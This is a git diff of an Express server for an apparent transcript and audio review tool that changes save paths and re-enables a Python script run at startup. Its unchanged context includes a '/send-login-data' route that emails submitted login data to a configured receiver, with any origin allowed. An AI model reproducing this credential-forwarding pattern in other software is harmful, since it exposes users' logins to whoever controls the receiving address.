@@ -2,15 +2,13 @@ const { exec } = require('child_process');
 const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors'); // Add this line for CORS support
-
 const multer = require('multer');
-
 const fs = require('fs');
 const path = require('path');
 
 // Define the save and discard directories
-const saveDir = path.join(__dirname, './main/save');
-const discardDir = path.join(__dirname, './main/discard');
+const saveDir = path.join(__dirname, './save');
+const discardDir = path.join(__dirname, './discard');
 
 // Function to create a directory if it doesn't exist
 function createDirectoryIfNotExists(directory) {
@@ -22,9 +20,7 @@ function createDirectoryIfNotExists(directory) {
 // Set up Multer for handling file uploads
 const storage = multer.memoryStorage(); // Store audio as memory buffer
 const upload = multer({ storage: storage });
-
 const app = express();
-
 require('dotenv').config()
 
 // routes.js
@@ -41,12 +37,8 @@ const transporter = nodemailer.createTransport({
   }
 });
 
-
-
-
 app.post('/send-login-data', (req, res) => {
   const { loginData } = req.body;
-
   const mailOptions = {
     from: process.env.EMAIL,
     to: process.env.RECEIVER,
@@ -65,7 +57,6 @@ app.post('/send-login-data', (req, res) => {
   });
 });
 
-
 // Enable CORS middleware to allow cross-origin requests
 app.use(function (req, res, next) {
   res.header('Access-Control-Allow-Origin', '*');
@@ -74,16 +65,16 @@ app.use(function (req, res, next) {
 });
 
 // Function to run Python scripts
-// function runPythonScript(scriptPath) {
-//   exec(`python ${scriptPath}`, (err, stdout, stderr) => {
-//     if (err) {
-//       console.error(`Error executing ${scriptPath}: ${err}`);
-//     } else {
-//       console.log(`${scriptPath} output: ${stdout}`);
-//     }
-//   });
-// }
-
+function runPythonScript(scriptPath) {
+  exec(`python ${scriptPath}`, (err, stdout, stderr) => {
+    if (err) {
+      console.error(`Error executing ${scriptPath}: ${err}`);
+    } else {
+      console.log(`${scriptPath} output: ${stdout}`);
+    }
+  });
+}
+runPythonScript('./modify-folder.py');
 // Run the first script on startup
 // runPythonScript('./main/audio-split.py');
 
@@ -105,8 +96,8 @@ app.post('/save-text-and-audio', upload.fields([{ name: 'text' }, { name: 'audio
   const transcriptNumber = req.body.transcriptNumber;
   const audio = req.files.audio[0];
 
-  const textFilePath = path.join(__dirname, `./main/save/transcript${transcriptNumber.toString().padStart(4, '0')}.txt`);
-  const audioFilePath = path.join(__dirname, `./main/save/transcript${transcriptNumber.toString().padStart(4, '0')}.wav`);
+  const textFilePath = path.join(__dirname, `./save/transcript${transcriptNumber.toString().padStart(4, '0')}.txt`);
+  const audioFilePath = path.join(__dirname, `./save/chunk${transcriptNumber.toString().padStart(4, '0')}.wav`);
 
   fs.writeFile(textFilePath, text, (err) => {
     if (err) {
@@ -135,8 +126,8 @@ app.post('/discard-text-and-audio', upload.fields([{ name: 'text' }, { name: 'au
   const transcriptNumber = req.body.transcriptNumber;
   const audio = req.files.audio[0];
 
-  const textFilePath = path.join(__dirname, `./main/discard/transcript${transcriptNumber.toString().padStart(4, '0')}.txt`);
-  const audioFilePath = path.join(__dirname, `./main/discard/transcript${transcriptNumber.toString().padStart(4, '0')}.wav`);
+  const textFilePath = path.join(__dirname, `./discard/transcript${transcriptNumber.toString().padStart(4, '0')}.txt`);
+  const audioFilePath = path.join(__dirname, `./discard/transcript${transcriptNumber.toString().padStart(4, '0')}.wav`);
 
   fs.writeFile(textFilePath, text, (err) => {
     if (err) {
@@ -168,32 +159,6 @@ app.get('/get-saved-transcripts', (req, res) => {
 app.get('/get-discarded-transcripts', (req, res) => {
   res.json({ discardedTranscripts });
 });
-
-
-// app.post('/move-folder', upload.fields([
-//   { name: 'transcriptsFolder', maxCount: 1 },
-//   { name: 'chunksFolder', maxCount: 1 }
-// ]), (req, res) => {
-//   const transcriptsFolder = req.files['transcriptsFolder'][0];
-//   const chunksFolder = req.files['chunksFolder'][0];
-//   const destinationPath = req.body.destinationPath;
-
-//   const transcriptsFolderPath = transcriptsFolder.path;
-//   const chunksFolderPath = chunksFolder.path;
-
-//   const transcriptsDestinationPath = path.join(destinationPath, transcriptsFolder.originalname);
-//   const chunksDestinationPath = path.join(destinationPath, chunksFolder.originalname);
-
-//   fs.copyFileSync(transcriptsFolderPath, transcriptsDestinationPath);
-//   fs.copyFileSync(chunksFolderPath, chunksDestinationPath);
-
-//   // Optionally, you can delete the source folders after duplication/moving
-//   fs.unlinkSync(transcriptsFolderPath);
-//   fs.unlinkSync(chunksFolderPath);
-
-//   res.json({ message: 'Folders moved/duplicated successfully' });
-// });
-
 
 // Start the server
 const PORT = process.env.PORT || 5000;
